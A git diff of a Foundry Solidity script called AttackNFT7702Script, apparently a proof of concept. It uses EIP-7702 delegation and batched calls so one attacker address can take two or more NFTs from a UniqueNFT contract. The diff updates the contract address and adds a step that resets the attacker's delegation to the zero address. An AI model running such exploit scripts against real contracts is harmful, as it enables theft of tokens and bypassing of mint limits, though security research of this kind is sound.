@@ -6,7 +6,7 @@ import { SimpleDelegateContract } from "../src/SimpleDelegateContract.sol";
 import { UniqueNFT } from "../src/UniqueNFT.sol";
 import { Vm } from "forge-std/Vm.sol";
 
-address constant UNIQUE_NFT = 0x618a25994cCBdd9724583d6d202339A7A0d1fA13;
+address constant UNIQUE_NFT = 0xB8CF7547Fb6E6e5E9B456Dc12D126f2BAB26F9f1;
 
 contract AttackNFT7702Script is Script {
     function run() public {
@@ -29,6 +29,11 @@ contract AttackNFT7702Script is Script {
         SimpleDelegateContract(payable(ATTACKER_ADDRESS)).execute(calls);
         uint256 attackerBalance = UniqueNFT(UNIQUE_NFT).balanceOf(ATTACKER_ADDRESS);
         require(attackerBalance >= 2, "Attacker did not receive 2 or more NFTs");
+        vm.stopBroadcast();
+        // 5. Sign and attach a new delegation to zero address
+        Vm.SignedDelegation memory signedDelegation_2 = vm.signDelegation(address(0), ATTACKER_PK, vm.getNonce(ATTACKER_ADDRESS) + 1);
+        vm.startBroadcast(ATTACKER_PK);
+        vm.attachDelegation(signedDelegation_2);
         vm.stopBroadcast();
     }
 }
